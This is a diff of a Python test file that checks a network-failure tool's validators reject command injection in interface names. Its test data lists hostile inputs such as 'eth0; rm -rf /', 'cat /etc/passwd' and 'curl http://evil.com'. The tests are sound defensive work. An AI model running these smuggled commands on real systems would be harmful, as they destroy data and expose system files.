@@ -413,7 +413,7 @@ class TestNetworkFailures:
     def test_validate_interface_blocks_command_injection(self):
         """Test that command injection attempts are blocked."""
         from src.failures.network import validate_interface_name
-        
+
         malicious_inputs = [
             "eth0; rm -rf /",
             "eth0 && cat /etc/passwd",
@@ -424,16 +424,16 @@ class TestNetworkFailures:
             "eth0\nrm -rf /",
             "eth0; curl http://evil.com",
         ]
-        
+
         for malicious in malicious_inputs:
             is_valid, error = validate_interface_name(malicious)
             assert is_valid is False, f"Should reject: {malicious}"
             assert error is not None
-    
+
     def test_validate_interface_allows_valid_names(self):
         """Test that valid interface names are accepted."""
         from src.failures.network import validate_interface_name
-        
+
         valid_inputs = [
             "eth0",
             "wlan0",
@@ -443,16 +443,16 @@ class TestNetworkFailures:
             "eth0:1",
             "docker0",
         ]
-        
+
         for valid in valid_inputs:
             is_valid, error = validate_interface_name(valid)
             assert is_valid is True, f"Should accept: {valid}"
             assert error is None
-    
+
     def test_validate_delay_blocks_invalid_values(self):
         """Test that invalid delay values are rejected."""
         from src.failures.network import validate_delay_ms
-        
+
         invalid_inputs = [
             -1,
             -100,
@@ -461,26 +461,22 @@ class TestNetworkFailures:
             None,
             [],
         ]
-        
+
         for invalid in invalid_inputs:
             is_valid, error = validate_delay_ms(invalid)
             assert is_valid is False
             assert error is not None
-    
+
     @patch("src.failures.network._run_cmd")
     def test_inject_network_rejects_malicious_interface(self, mock_cmd, capsys):
         """Test that network injection rejects command injection."""
-        config = {
-            "interface": "eth0; rm -rf /",
-            "delay_ms": 100,
-            "duration_seconds": 1
-        }
-        
+        config = {"interface": "eth0; rm -rf /", "delay_ms": 100, "duration_seconds": 1}
+
         inject_network(config, dry_run=False)
-        
+
         # Should not execute any commands
         mock_cmd.assert_not_called()
-        
+
         # Should log validation failure
         captured = capsys.readouterr()
         assert "Validation failed" in captured.out
